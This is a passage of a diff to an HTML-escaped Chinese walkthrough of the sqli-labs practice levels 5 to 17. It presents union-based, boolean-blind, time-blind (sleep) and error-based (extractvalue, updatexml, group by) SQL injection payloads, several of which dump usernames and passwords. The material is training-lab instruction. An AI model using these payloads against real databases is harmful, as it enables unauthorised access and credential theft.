 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;?id=-1&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;union&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;group_concat&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;table_name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;from&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;information_schema&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;tables&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;where&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;table_schema&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;security&amp;#39;&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;--+
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;?&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;id&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&amp;#39;users&amp;#39;--+
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;?id=-1&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;union&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;group_concat&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;username&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;id&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;password&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;from&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;users&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;--+
-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;less---5&#34;&gt;less - 5&lt;/h2&gt;
-&lt;p&gt;经过测试可以判断是字符类型且闭合符为&lt;code&gt;&#39;&lt;/code&gt;，但是在这关中正常显示的时候只会显示一个页面。&lt;/p&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;less---5&#34;&gt;less - 5
+&lt;/h2&gt;&lt;p&gt;经过测试可以判断是字符类型且闭合符为&lt;code&gt;&#39;&lt;/code&gt;，但是在这关中正常显示的时候只会显示一个页面。&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202405211835036.png&#34;
 	
 	
@@ -866,14 +866,14 @@
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;?id=1&amp;#39;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;and&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ascii&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;substr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;((&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;group_concat&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;username&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;password&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;from&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;users&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;50&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;--+
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;逐一检测内容。&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;然后可以根据这些sql语句来编写盲注脚本&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;less---6&#34;&gt;less - 6&lt;/h2&gt;
-&lt;p&gt;闭合符为&lt;code&gt;&amp;quot;&lt;/code&gt;，方法同&lt;code&gt;less-5&lt;/code&gt;&lt;/p&gt;
-&lt;h2 id=&#34;less---7&#34;&gt;less - 7&lt;/h2&gt;
-&lt;p&gt;闭合符为&lt;code&gt;&#39;))&lt;/code&gt;，方法同&lt;code&gt;less-5&lt;/code&gt;&lt;/p&gt;
-&lt;h2 id=&#34;less---8&#34;&gt;less - 8&lt;/h2&gt;
-&lt;p&gt;闭合符为&lt;code&gt;&#39;&lt;/code&gt;，这关除了不会显示报错信息以外，方法同&lt;code&gt;less-5&lt;/code&gt;&lt;/p&gt;
-&lt;h2 id=&#34;less---9&#34;&gt;less - 9&lt;/h2&gt;
-&lt;p&gt;这关无论输入什么页面显示的内容都是一样的，所以布尔盲注就用不了了，但是它依然可以执行我们插入的sql语句。因此在页面不变的时候，我们可以使用时间盲注，就是但判断为真时，让页面过几秒再渲染，这里就需要使用&lt;code&gt;sleep()&lt;/code&gt;函数。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;less---6&#34;&gt;less - 6
+&lt;/h2&gt;&lt;p&gt;闭合符为&lt;code&gt;&amp;quot;&lt;/code&gt;，方法同&lt;code&gt;less-5&lt;/code&gt;&lt;/p&gt;
+&lt;h2 id=&#34;less---7&#34;&gt;less - 7
+&lt;/h2&gt;&lt;p&gt;闭合符为&lt;code&gt;&#39;))&lt;/code&gt;，方法同&lt;code&gt;less-5&lt;/code&gt;&lt;/p&gt;
+&lt;h2 id=&#34;less---8&#34;&gt;less - 8
+&lt;/h2&gt;&lt;p&gt;闭合符为&lt;code&gt;&#39;&lt;/code&gt;，这关除了不会显示报错信息以外，方法同&lt;code&gt;less-5&lt;/code&gt;&lt;/p&gt;
+&lt;h2 id=&#34;less---9&#34;&gt;less - 9
+&lt;/h2&gt;&lt;p&gt;这关无论输入什么页面显示的内容都是一样的，所以布尔盲注就用不了了，但是它依然可以执行我们插入的sql语句。因此在页面不变的时候，我们可以使用时间盲注，就是但判断为真时，让页面过几秒再渲染，这里就需要使用&lt;code&gt;sleep()&lt;/code&gt;函数。&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;?&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;id&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; and if(1=1,sleep(5),1)--+
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;判断参数构造。
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;?id=1&amp;#39;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;and&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;length&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;((&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;database&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()))&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;9&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sleep&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;--+
@@ -899,10 +899,10 @@
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;?&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;id&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; and if(ascii(substr((select group_concat(username,password) from users),1,1))&amp;gt;50,sleep(5),1)--+
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;逐一检测内容。
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;和布尔盲注一样，需要花费很多时间去一点一点尝试，所以可以构造一个脚本进行测试。&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;less---10&#34;&gt;less - 10&lt;/h2&gt;
-&lt;p&gt;闭合符为&lt;code&gt;&amp;quot;&lt;/code&gt;，方法同&lt;code&gt;less-9&lt;/code&gt;&lt;/p&gt;
-&lt;h2 id=&#34;less---11&#34;&gt;less - 11&lt;/h2&gt;
-&lt;p&gt;这关的页面就和之前的不同了，是一个登录界面。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;less---10&#34;&gt;less - 10
+&lt;/h2&gt;&lt;p&gt;闭合符为&lt;code&gt;&amp;quot;&lt;/code&gt;，方法同&lt;code&gt;less-9&lt;/code&gt;&lt;/p&gt;
+&lt;h2 id=&#34;less---11&#34;&gt;less - 11
+&lt;/h2&gt;&lt;p&gt;这关的页面就和之前的不同了，是一个登录界面。&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202405232248969.png&#34;
 	
 	
@@ -938,20 +938,20 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;后面方法同之前一样。&lt;/p&gt;
-&lt;h2 id=&#34;less---12&#34;&gt;less - 12&lt;/h2&gt;
-&lt;p&gt;闭合符为&lt;code&gt;&amp;quot;)&lt;/code&gt;方法同&lt;code&gt;less-11&lt;/code&gt;&lt;/p&gt;
-&lt;h2 id=&#34;less---13&#34;&gt;less - 13&lt;/h2&gt;
-&lt;p&gt;闭合符为&lt;code&gt;&#39;)&lt;/code&gt;，但是这关只显示登录成功或失败，所以这关考点是布尔盲注。&lt;/p&gt;
+&lt;h2 id=&#34;less---12&#34;&gt;less - 12
+&lt;/h2&gt;&lt;p&gt;闭合符为&lt;code&gt;&amp;quot;)&lt;/code&gt;方法同&lt;code&gt;less-11&lt;/code&gt;&lt;/p&gt;
+&lt;h2 id=&#34;less---13&#34;&gt;less - 13
+&lt;/h2&gt;&lt;p&gt;闭合符为&lt;code&gt;&#39;)&lt;/code&gt;，但是这关只显示登录成功或失败，所以这关考点是布尔盲注。&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;) or length((select database()))&amp;gt;9#
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这里需要使用&lt;code&gt;or&lt;/code&gt;，因为登录账号是错误的，所以需要由后面的判断来决定这段语句的&lt;code&gt;true or false&lt;/code&gt;&lt;/p&gt;
-&lt;h2 id=&#34;less---14&#34;&gt;less - 14&lt;/h2&gt;
-&lt;p&gt;闭合符为&lt;code&gt;&amp;quot;&lt;/code&gt;，方法同&lt;code&gt;less-13&lt;/code&gt;&lt;/p&gt;
-&lt;h2 id=&#34;less---15&#34;&gt;less - 15&lt;/h2&gt;
-&lt;p&gt;闭合符为&lt;code&gt;&#39;&lt;/code&gt;，方法同&lt;code&gt;less-13&lt;/code&gt;&lt;/p&gt;
-&lt;h2 id=&#34;less---16&#34;&gt;less - 16&lt;/h2&gt;
-&lt;p&gt;闭合符为&lt;code&gt;&amp;quot;)&lt;/code&gt;，方法同&lt;code&gt;less-13&lt;/code&gt;&lt;/p&gt;
-&lt;h2 id=&#34;less---17&#34;&gt;less - 17&lt;/h2&gt;
-&lt;p&gt;这关又有新的东西了，先看部分源代码&lt;/p&gt;
+&lt;h2 id=&#34;less---14&#34;&gt;less - 14
+&lt;/h2&gt;&lt;p&gt;闭合符为&lt;code&gt;&amp;quot;&lt;/code&gt;，方法同&lt;code&gt;less-13&lt;/code&gt;&lt;/p&gt;
+&lt;h2 id=&#34;less---15&#34;&gt;less - 15
+&lt;/h2&gt;&lt;p&gt;闭合符为&lt;code&gt;&#39;&lt;/code&gt;，方法同&lt;code&gt;less-13&lt;/code&gt;&lt;/p&gt;
+&lt;h2 id=&#34;less---16&#34;&gt;less - 16
+&lt;/h2&gt;&lt;p&gt;闭合符为&lt;code&gt;&amp;quot;)&lt;/code&gt;，方法同&lt;code&gt;less-13&lt;/code&gt;&lt;/p&gt;
+&lt;h2 id=&#34;less---17&#34;&gt;less - 17
+&lt;/h2&gt;&lt;p&gt;这关又有新的东西了，先看部分源代码&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;check_input&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$value&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;           &lt;span class=&#34;c1&#34;&gt;// $value是 username 中的内容
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;	&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;empty&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$value&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
@@ -989,8 +989,8 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;这里需要用到的就是报错注入。报错注入一般使用这三个函数&lt;code&gt;extractvalue()&lt;/code&gt;、&lt;code&gt;updatexml()&lt;/code&gt;、&lt;code&gt;group by()&lt;/code&gt;。&lt;/p&gt;
-&lt;h3 id=&#34;extractvalue&#34;&gt;extractvalue&lt;/h3&gt;
-&lt;p&gt;&lt;code&gt;extractvalue(XML_document, Path_string)&lt;/code&gt;&lt;/p&gt;
+&lt;h3 id=&#34;extractvalue&#34;&gt;extractvalue
+&lt;/h3&gt;&lt;p&gt;&lt;code&gt;extractvalue(XML_document, Path_string)&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc&lt;/p&gt;
 &lt;p&gt;第二个参数：XPath_string（XPath格式的字符串）&lt;/p&gt;
 &lt;p&gt;原理：extractvalue(xml_frag, xpath_expr) 函数接收两个参数，一个是XML文档片段，另一个是XPath表达式。正常情况下，这个函数会根据给定的XPath路径从XML文档中提取数据。然而，当XPath表达式构造不当，例如包含了非法字符或者尝试执行一个无法解析为有效XPath表达式的字符串时，函数会抛出错误，并且错误信息可能包含有关查询的信息，这便为报错注入提供了机会。攻击者可以通过精心构造的XPath表达式来触发错误，进而获取数据库敏感信息。&lt;/p&gt;
@@ -1014,8 +1014,8 @@
 	
 	
 &gt;&lt;/p&gt;
-&lt;h3 id=&#34;updatexml&#34;&gt;updatexml&lt;/h3&gt;
-&lt;p&gt;&lt;code&gt;updatexml(XML_document, XPath_string, new_value)&lt;/code&gt;&lt;/p&gt;
+&lt;h3 id=&#34;updatexml&#34;&gt;updatexml
+&lt;/h3&gt;&lt;p&gt;&lt;code&gt;updatexml(XML_document, XPath_string, new_value)&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;第一个参数：XML_document是String格式，为XML文档对象的名称。&lt;/p&gt;
 &lt;p&gt;第二个参数：XPath_string(XPath格式的字符串)&lt;/p&gt;
 &lt;p&gt;第三个参数：new_value, String格式，替换查找到的符合条件的数据&lt;/p&gt;
@@ -1041,8 +1041,8 @@
 	
 	
 &gt;&lt;/p&gt;
-&lt;h3 id=&#34;group-by&#34;&gt;group by&lt;/h3&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;mi&#34;&gt;123&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; and (select count(*) from information_schema.tables group by concat(database(),0x5c,floor(rand(0)*2)))#     爆数据库
+&lt;h3 id=&#34;group-by&#34;&gt;group by
+&lt;/h3&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;mi&#34;&gt;123&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; and (select count(*) from information_schema.tables group by concat(database(),0x5c,floor(rand(0)*2)))#     爆数据库
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;123&amp;#39;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;and&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;count&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;from&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;information_schema&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;tables&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;group&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;by&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;concat&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;version&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(),&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;x5c&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;floor&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;rand&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)))&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;#&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;      &lt;/span&gt;&lt;span class=&#34;err&#34;&gt;爆数据库版本&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; and (select count(*) from information_schema.tables where table_schema=database() group by concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 1,1),0x7e,floor(rand(0)*2)))#    通过修改limit后面数字一个一个爆表
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;1&amp;#39;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;and&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;count&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;from&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;information_schema&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;tables&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;where&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;table_schema&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;database&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;group&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;by&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;concat&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;x7e&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;group_concat&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;table_name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;from&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;information_schema&lt;/span&gt;&lt;span 